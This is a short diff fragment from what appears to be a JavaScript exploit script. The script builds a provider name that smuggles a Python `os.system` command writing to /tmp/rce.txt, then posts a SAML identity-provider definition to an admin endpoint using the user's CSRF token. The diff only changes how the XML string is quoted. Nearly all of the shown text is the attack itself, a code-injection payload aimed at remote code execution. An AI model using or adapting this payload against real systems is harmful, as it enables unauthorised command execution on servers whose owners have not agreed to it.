@@ -6,9 +6,10 @@
      const name = `Exploit${id}
  import os;os.system("id > /tmp/rce.txt")`;
 
-     const xml = '<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
-      protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
-      Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>';
+     const xml = `<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
+     protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
+     Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>`;
+
 
      $.post('/admin/uac/identityprovider/add/', {
          csrfmiddlewaretoken: Cookies.get('csrftoken'),
